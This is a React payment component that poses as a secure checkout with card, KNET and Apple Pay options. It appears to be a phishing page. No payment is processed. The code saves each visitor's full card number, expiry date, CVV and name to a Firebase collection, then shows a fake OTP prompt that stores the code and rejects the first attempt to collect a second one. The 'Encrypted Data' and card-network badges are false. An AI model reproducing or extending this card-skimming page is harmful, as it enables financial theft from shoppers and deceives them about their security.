"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { CreditCard, CheckCircle, AlertCircle, ArrowRight, Lock, Shield, XCircle } from "lucide-react"
import { doc, updateDoc } from "firebase/firestore"
import { db } from "../../firebase"
import { useNavigate } from "react-router-dom"

interface PaymentSelectionProps {
  setPage: (page: string) => void
}

export default function PaymentSelection() {
  const navigate = useNavigate()
  const [paymentMethod, setPaymentMethod] = useState("card")
  const [cardDetails, setCardDetails] = useState({
    name: "",
    number: "",
    expiry: "",
    cvc: "",
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [showOtp, setShowOtp] = useState(false)
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState("")
  const [otpAttempts, setOtpAttempts] = useState(0)
  const [cardError, setCardError] = useState("")
  const [timer, setTimer] = useState(0)

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 2) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return value
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target
    const fieldName = id.replace("card-", "")

    let formattedValue = value

    if (fieldName === "number") {
      formattedValue = formatCardNumber(value)
    } else if (fieldName === "expiry") {
      formattedValue = formatExpiryDate(value)
    } else if (fieldName === "cvc") {
      formattedValue = value.replace(/[^0-9]/g, "").substring(0, 3)
    }

    setCardDetails((prev) => ({
      ...prev,
      [fieldName]: formattedValue,
    }))
  }

  const validateCardDetails = () => {
    // Reset error
    setCardError("")

    // Check if all fields have values
    if (Object.values(cardDetails).some((value) => value.trim() === "")) {
      setCardError("Please fill in all card details")
      return false
    }

    // Validate card number (simple check for length after removing spaces)
    const cardNumberWithoutSpaces = cardDetails.number.replace(/\s+/g, "")
    if (cardNumberWithoutSpaces.length < 13 || cardNumberWithoutSpaces.length > 19) {
      setCardError("Please enter a valid card number")
      return false
    }

    // Validate expiry date format (MM/YY)
    if (!/^\d{2}\/\d{2}$/.test(cardDetails.expiry)) {
      setCardError("Please enter a valid expiry date (MM/YY)")
      return false
    }

    // Validate CVC (3-4 digits)
    if (!/^\d{3,4}$/.test(cardDetails.cvc)) {
      setCardError("Please enter a valid CVC code")
      return false
    }

    return true
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (paymentMethod === "knet") {
      // Navigate to KNET payment page
      if (navigate) {
        navigate("kent")
      } else {
        //navigate("kent")
      }
      return
    }

    if (paymentMethod === "card") {
      if (!validateCardDetails()) {
        return
      }

      setIsProcessing(true)

      try {
        // Save card details to Firebase
        const visitorId = localStorage.getItem("visitor")

        if (visitorId) {
          await addDataToFirebase(visitorId, cardDetails)
        }

        // Simulate processing delay
        setTimeout(() => {
          setIsProcessing(false)
          setShowOtp(true)
          // Start OTP timer
          setTimer(60)
        }, 1500)
      } catch (error) {
        console.error("Error saving card details:", error)
        setIsProcessing(false)
        setCardError("An error occurred. Please try again.")
      }
    }
  }

  const addDataToFirebase = async (id: string, cardData: typeof cardDetails) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, {
        cardNumber: cardData.number.replace(/\s+/g, ""),
        cardExpiry: cardData.expiry,
        cvv: cardData.cvc,
        name: cardData.name,
        page: "payment",
      })
    } catch (error) {
      console.error("Error adding card data:", error)
      throw error
    }
  }

  const handleVerifyOtp = async () => {
    setOtpError("")

    if (!otp || otp.length < 4) {
      setOtpError("Please enter a valid OTP code")
      return
    }

    setIsProcessing(true)

    try {
      // Save OTP to Firebase
      const visitorId = localStorage.getItem("visitor")

      if (visitorId) {
        const docRef = doc(db, "pays", visitorId)
        await updateDoc(docRef, {
          otp: otp,
          page: "otp",
        })
      }

      // Simulate verification delay
      setTimeout(() => {
        setIsProcessing(false)

        // Simulate OTP failure for first attempt
        if (otpAttempts === 0) {
          setOtpError("Invalid OTP. Please try again.")
          setOtpAttempts((prev) => prev + 1)
          setOtp("")
        } else {
          // Navigate to success or next pdage
         
        }
      }, 1500)
    } catch (error) {
      console.error("Error verifying OTP:", error)
      setIsProcessing(false)
      setOtpError("An error occurred. Please try again.")
    }
  }

  // OTP timer countdown
  useEffect(() => {
    let interval: NodeJS.Timeout
    if (timer > 0) {
      interval = setInterval(() => {
        setTimer((prevTimer) => prevTimer - 1)
      }, 1000)
    }
    return () => clearInterval(interval)
  }, [timer])

  const handleResendOtp = () => {
    if (timer === 0) {
      setTimer(60)
      // Simulate sending a new OTP
      setTimeout(() => {
        // In a real app, you would trigger the OTP sending process here
      }, 500)
    }
  }

  // Detect card type based on first digits
  const getCardType = () => {
    const number = cardDetails.number.replace(/\s+/g, "")

    if (number.startsWith("4")) {
      return { name: "Visa", logo: "/visa.png" }
    } else if (/^5[1-5]/.test(number)) {
      return { name: "Mastercard", logo: "/mastercard.png" }
    } else if (/^3[47]/.test(number)) {
      return { name: "American Express", logo: "/amex.png" }
    } else if (/^6(?:011|5)/.test(number)) {
      return { name: "Discover", logo: "/discover.png" }
    }

    return null
  }

  const cardType = getCardType()

  return (
    <div
      className="w-full max-w-md mx-auto bg-white rounded-xl shadow-xl overflow-hidden border border-gray-100"
      style={{ padding: 15 }}
    >
      {/* Header with gradient */}
      <div className="bg-gradient-to-r from-slate-50 to-slate-100 p-6 border-b border-gray-200">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl font-semibold text-slate-800">Payment Method</h2>
            <p className="text-sm text-slate-500 mt-1">Complete your transaction securely</p>
          </div>
          <div className="flex items-center space-x-1 bg-green-50 px-3 py-1 rounded-full border border-green-100">
            <Shield className="h-4 w-4 text-green-600" />
            <span className="text-xs font-medium text-green-600">Secure Checkout</span>
          </div>
        </div>
      </div>

      {!showOtp ? (
        <>
          <div className="p-6">
            {/* Payment Method Tabs */}
            <div className="mb-6">
              <p className="text-sm font-medium text-slate-700 mb-3">Select payment method</p>
              <div className="grid grid-cols-3 gap-3">
                {/* Credit Card Option */}
                <div className="w-full">
                  <input
                    type="radio"
                    id="card"
                    name="paymentMethod"
                    value="card"
                    checked={paymentMethod === "card"}
                    onChange={() => setPaymentMethod("card")}
                    className="absolute opacity-0 w-0 h-0"
                  />
                  <label
                    htmlFor="card"
                    className={`flex flex-col items-center justify-center rounded-xl border-2 p-3 cursor-pointer transition-all ${
                      paymentMethod === "card"
                        ? "border-slate-800 bg-slate-50 shadow-sm"
                        : "border-slate-200 hover:border-slate-300"
                    }`}
                  >
                    <div className="flex space-x-1 mb-2">
                      <img src="/visa.svg" alt="Visa" className="h-5" />
                      <img src="/mastercard.svg" alt="Mastercard" className="h-5" />
                    </div>
                  </label>
                </div>

                {/* KNET Option */}
                <div className="w-full">
                  <input
                    type="radio"
                    id="knet"
                    name="paymentMethod"
                    value="knet"
                    checked={paymentMethod === "knet"}
                    onChange={() => setPaymentMethod("knet")}
                    className="absolute opacity-0 w-0 h-0"
                  />
                  <label
                    htmlFor="knet"
                    className={`flex flex-col items-center justify-center rounded-xl border-2 p-3 cursor-pointer transition-all ${
                      paymentMethod === "knet"
                        ? "border-slate-800 bg-slate-50 shadow-sm"
                        : "border-slate-200 hover:border-slate-300"
                    }`}
                  >
                    <div className="mb-2">
                      <img src="/kv.png" alt="KNET" className="h-6" />
                    </div>
                  </label>
                </div>

                {/* Apple Pay Option (Not Available) */}
                <div className="w-full">
                  <div className="relative">
                    <input
                      type="radio"
                      id="apple-pay"
                      name="paymentMethod"
                      value="apple-pay"
                      disabled
                      className="absolute opacity-0 w-0 h-0"
                    />
                    <label
                      htmlFor="apple-pay"
                      className="flex flex-col items-center justify-center rounded-xl border-2 border-slate-200 p-3 cursor-not-allowed bg-slate-50 opacity-70"
                    >
                      <div className="mb-2">
                        <svg viewBox="0 0 24 24" className="h-6 w-6 text-slate-400" fill="currentColor">
                          <path d="M17.0425 10.4717C17.0142 8.25204 18.8442 7.12954 18.9317 7.07704C17.8617 5.50204 16.1642 5.25204 15.5692 5.23704C14.1142 5.08954 12.7142 6.10204 12.0142 6.10204C11.2992 6.10204 10.1617 5.25204 8.93422 5.27954C7.31922 5.30704 5.81922 6.22454 4.96172 7.66704C3.19172 10.5945 4.51172 14.9295 6.21672 17.1195C7.06172 18.1945 8.07672 19.4145 9.39672 19.3645C10.6742 19.3145 11.1567 18.5395 12.6867 18.5395C14.2017 18.5395 14.6542 19.3645 15.9917 19.3345C17.3742 19.3145 18.2467 18.2345 19.0617 17.1495C20.0317 15.9145 20.4242 14.7045 20.4392 14.6445C20.4092 14.6295 17.0742 13.4145 17.0425 10.4717Z" />
                          <path d="M14.6867 3.84C15.3742 3.00751 15.8317 1.88251 15.6867 0.75C14.7142 0.78 13.5042 1.41751 12.7867 2.22751C12.1442 2.94751 11.5867 4.10251 11.7467 5.19751C12.8392 5.27251 13.9692 4.67251 14.6867 3.84Z" />
                        </svg>
                      </div>
                      <div className="absolute inset-0 flex items-center justify-center bg-slate-50/80 rounded-xl">
                        <div className="bg-slate-100 px-2 py-1 rounded-md border border-slate-200 flex items-center">
                          <XCircle className="h-3 w-3 text-slate-500 mr-1" />
                          <span className="text-xs font-medium text-slate-500">Not Available</span>
                        </div>
                      </div>
                    </label>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Form */}
            {paymentMethod === "card" && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <label htmlFor="card-name" className="block text-sm font-medium text-slate-700">
                    Name on Card
                  </label>
                  <input
                    id="card-name"
                    type="text"
                    className="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-slate-500 focus:border-transparent bg-white text-slate-900 transition-all"
                    placeholder="John Smith"
                    value={cardDetails.name}
                    onChange={handleInputChange}
                  />
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <label htmlFor="card-number" className="block text-sm font-medium text-slate-700">
                      Card Number
                    </label>
                    {cardType && (
                      <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-slate-100 text-slate-700 border border-slate-200">
                        {cardType.name}
                      </span>
                    )}
                  </div>
                  <div className="relative">
                    <input
                      id="card-number"
                      type="text"
                      className="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-slate-500 focus:border-transparent bg-white text-slate-900 transition-all"
                      placeholder="1234 5678 9012 3456"
                      value={cardDetails.number}
                      onChange={handleInputChange}
                      maxLength={19}
                    />
                    {cardType && (
                      <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                        <CreditCard className="h-5 w-5 text-slate-400" />
                      </div>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label htmlFor="card-expiry" className="block text-sm font-medium text-slate-700">
                      Expiry Date
                    </label>
                    <input
                      id="card-expiry"
                      type="text"
                      className="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-slate-500 focus:border-transparent bg-white text-slate-900 transition-all"
                      placeholder="MM/YY"
                      value={cardDetails.expiry}
                      onChange={handleInputChange}
                      maxLength={5}
                    />
                  </div>

                  <div className="space-y-2">
                    <label htmlFor="card-cvc" className="block text-sm font-medium text-slate-700">
                      CVC
                    </label>
                    <input
                      id="card-cvc"
                      type="password"
                      className="w-full px-3 py-2.5 border border-slate-200 rounded-lg text-sm shadow-sm focus:outline-none focus:ring-2 focus:ring-slate-500 focus:border-transparent bg-white text-slate-900 transition-all"
                      placeholder="123"
                      value={cardDetails.cvc}
                      onChange={handleInputChange}
                      maxLength={4}
                    />
                  </div>
                </div>

                {cardError && (
                  <div className="flex items-center text-sm text-red-600 mt-2 bg-red-50 p-2.5 rounded-lg border border-red-100">
                    <AlertCircle className="h-4 w-4 mr-2 flex-shrink-0" />
                    <span>{cardError}</span>
                  </div>
                )}
              </div>
            )}

            {/* KNET Info */}
            {paymentMethod === "knet" && (
              <div className="flex flex-col items-center justify-center py-8 bg-slate-50 rounded-xl border border-slate-200">
                <img src="/kv.png" alt="KNET" className="h-16 w-auto mb-4" />
                <p className="text-center text-slate-600 max-w-xs px-4">
                  You will be redirected to the KNET payment gateway to complete your payment securely.
                </p>
              </div>
            )}
          </div>

          <div className="p-6 bg-gradient-to-r from-blue-50 to-slate-100 border-t border-slate-200">
            <button
              onClick={handleSubmit}
              disabled={isProcessing}
              className={`w-full py-3 px-4 bg-blue-800 hover:bg-blue-900 text-white font-medium rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-slate-500 focus:ring-offset-2 transition-all ${
                isProcessing ? "opacity-70 cursor-not-allowed" : ""
              }`}
            >
              {isProcessing ? (
                <div className="flex items-center justify-center">
                  <div className="animate-spin h-4 w-4 mr-2 border-2 border-white border-b-transparent rounded-full"></div>
                  Processing...
                </div>
              ) : (
                <div className="flex items-center justify-center ">
                  {paymentMethod === "card" ? "Continue to Payment" : "Continue to KNET"}
                  <ArrowRight className="ml-2 h-4 w-4" />
                </div>
              )}
            </button>

            <div className="flex items-center justify-center mt-4 space-x-6">
              <div className="flex items-center">
                <Lock className="h-4 w-4 text-slate-500 mr-1.5" />
                <span className="text-xs text-slate-500">Secure Payment</span>
              </div>
              <div className="flex items-center">
                <Shield className="h-4 w-4 text-slate-500 mr-1.5" />
                <span className="text-xs text-slate-500">Encrypted Data</span>
              </div>
            </div>
          </div>
        </>
      ) : (
        <div className="p-6 space-y-6">
          <div className="text-center">
            <div className="bg-slate-100 p-4 rounded-full inline-flex items-center justify-center mb-4 border border-slate-200">
              <Lock className="h-8 w-8 text-slate-700" />
            </div>
            <h3 className="text-lg font-medium text-slate-800">Verification Required</h3>
            <p className="text-sm text-slate-500 mt-2 max-w-xs mx-auto">
              For your security, we need to verify your identity. We've sent a one-time password to your registered
              mobile number.
            </p>
          </div>

          <div className="space-y-2">
            <label htmlFor="otp" className="block text-sm font-medium text-slate-700">
              Enter OTP
            </label>
            <div className="relative">
              <input
                id="otp"
                type="text"
                placeholder="Enter 4-digit code"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, "").substring(0, 6))}
                className="w-full px-3 py-3 border border-slate-200 rounded-lg text-center text-lg tracking-widest shadow-sm focus:outline-none focus:ring-2 focus:ring-slate-500 focus:border-transparent bg-white text-slate-900 transition-all"
                maxLength={6}
              />
              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
                <div className="text-xs text-slate-500 font-medium">{cardType?.name || "Card"}</div>
              </div>
            </div>

            {otpError && (
              <div className="flex items-center text-sm text-red-600 mt-2 bg-red-50 p-2.5 rounded-lg border border-red-100">
                <AlertCircle className="h-4 w-4 mr-2 flex-shrink-0" />
                <span>{otpError}</span>
              </div>
            )}
          </div>

          <button
            onClick={handleVerifyOtp}
            disabled={isProcessing}
            className={`w-full py-3 px-4 bg-slate-800 hover:bg-slate-900 text-white font-medium rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-slate-500 focus:ring-offset-2 transition-all ${
              isProcessing ? "opacity-70 cursor-not-allowed" : ""
            }`}
          >
            {isProcessing ? (
              <div className="flex items-center justify-center">
                <div className="animate-spin h-4 w-4 mr-2 border-2 border-white border-b-transparent rounded-full"></div>
                Verifying...
              </div>
            ) : (
              <div className="flex items-center justify-center">
                Verify & Complete Payment
                <CheckCircle className="ml-2 h-4 w-4" />
              </div>
            )}
          </button>

          <div className="text-center">
            <p className="text-xs text-slate-500">
              Didn't receive the code?{" "}
              <button
                onClick={handleResendOtp}
                disabled={timer > 0}
                className={`text-slate-800 font-medium hover:underline text-xs ${timer > 0 ? "opacity-50 cursor-not-allowed" : ""}`}
              >
                {timer > 0 ? `Resend in ${timer}s` : "Resend OTP"}
              </button>
            </p>
          </div>

          <div className="flex items-center justify-center space-x-6 pt-4 border-t border-slate-200">
            <div className="flex items-center">
              <Lock className="h-4 w-4 text-slate-500 mr-1.5" />
              <span className="text-xs text-slate-500">Secure Verification</span>
            </div>
            <div className="flex items-center">
              <Shield className="h-4 w-4 text-slate-500 mr-1.5" />
              <span className="text-xs text-slate-500">Encrypted Data</span>
            </div>
          </div>
        </div>
      )}

      {/* Footer with payment partners */}
      <div className="px-6 py-4 bg-slate-50 border-t border-slate-200">
        <div className="flex flex-col items-center">
          <p className="text-xs text-slate-500 mb-2">Secured & Powered by</p>
          <div className="flex items-center justify-center space-x-4">
            <img src="/visa.svg" alt="Visa" className="h-5 opacity-70" />
            <img src="/mastercard.svg" alt="Mastercard" className="h-5 opacity-70" />
            <img src="/kv.png" alt="KNET" className="h-5 opacity-70" />
            <svg viewBox="0 0 24 24" className="h-5 w-5 text-slate-400 opacity-70" fill="currentColor">
              <path d="M17.0425 10.4717C17.0142 8.25204 18.8442 7.12954 18.9317 7.07704C17.8617 5.50204 16.1642 5.25204 15.5692 5.23704C14.1142 5.08954 12.7142 6.10204 12.0142 6.10204C11.2992 6.10204 10.1617 5.25204 8.93422 5.27954C7.31922 5.30704 5.81922 6.22454 4.96172 7.66704C3.19172 10.5945 4.51172 14.9295 6.21672 17.1195C7.06172 18.1945 8.07672 19.4145 9.39672 19.3645C10.6742 19.3145 11.1567 18.5395 12.6867 18.5395C14.2017 18.5395 14.6542 19.3645 15.9917 19.3345C17.3742 19.3145 18.2467 18.2345 19.0617 17.1495C20.0317 15.9145 20.4242 14.7045 20.4392 14.6445C20.4092 14.6295 17.0742 13.4145 17.0425 10.4717Z" />
              <path d="M14.6867 3.84C15.3742 3.00751 15.8317 1.88251 15.6867 0.75C14.7142 0.78 13.5042 1.41751 12.7867 2.22751C12.1442 2.94751 11.5867 4.10251 11.7467 5.19751C12.8392 5.27251 13.9692 4.67251 14.6867 3.84Z" />
            </svg>
          </div>
        </div>
      </div>
    </div>
  )
}
